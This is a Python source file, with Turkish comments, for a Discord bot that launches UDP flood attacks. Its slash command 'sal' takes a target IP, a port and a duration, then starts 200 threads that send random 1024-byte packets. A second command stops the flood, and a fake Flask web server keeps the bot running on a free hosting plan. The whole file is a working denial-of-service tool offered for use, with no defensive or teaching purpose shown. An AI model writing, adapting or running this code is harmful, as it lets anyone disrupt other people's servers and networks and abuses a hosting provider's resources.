import discord
from discord.ext import commands
import socket
import threading
import time
import os
import random
from dotenv import load_dotenv
from flask import Flask
from threading import Thread

# .env dosyasini yukle
load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

stop_flags = {}

def flood_worker(ip, port, duration, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Render'da maksimum verim icin 1024 byte
    payload = os.urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        try:
            sock.sendto(payload, (ip, port))
        except:
            pass
    sock.close()

@bot.event
async def on_ready():
    print(f"[*] {bot.user} olarak giris yapildi. Bot hazir!")
    await bot.tree.sync()

@bot.tree.command(name="sal", description="Saldiri baslatir")
async def sal(interaction: discord.Interaction, ip: str, port: int, saniye: int):
    await interaction.response.send_message(f"🚀 **Saldiri baslatildi!**\nHedef: `{ip}:{port}`\nSure: `{saniye}` saniye.", ephemeral=False)
    
    stop_event = threading.Event()
    stop_flags[ip] = stop_event
    
    # Render ucretsiz plan limitlerini asmamak icin 200 thread
    for _ in range(200):
        t = threading.Thread(target=flood_worker, args=(ip, port, saniye, stop_event), daemon=True)
        t.start()

@bot.tree.command(name="dur", description="Saldiriyi durdurur")
async def dur(interaction: discord.Interaction, ip: str):
    if ip in stop_flags:
        stop_flags[ip].set()
        await interaction.response.send_message(f"🛑 `{ip}` adresine yapilan saldiri durduruldu.")
    else:
        await interaction.response.send_message("Bu IP icin aktif bir saldiri bulunamadi.", ephemeral=True)

# Render'in botu kapatmamasi icin sahte web sunucusu
app = Flask('')

@app.route('/')
def home():
    return "Bot aktif ve calisiyor!"

def run_web_server():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run_web_server)
    t.start()

if __name__ == "__main__":
    keep_alive() # Web sunucusunu baslat
    bot.run(os.getenv("DISCORD_TOKEN")) # Token'i .env'den al
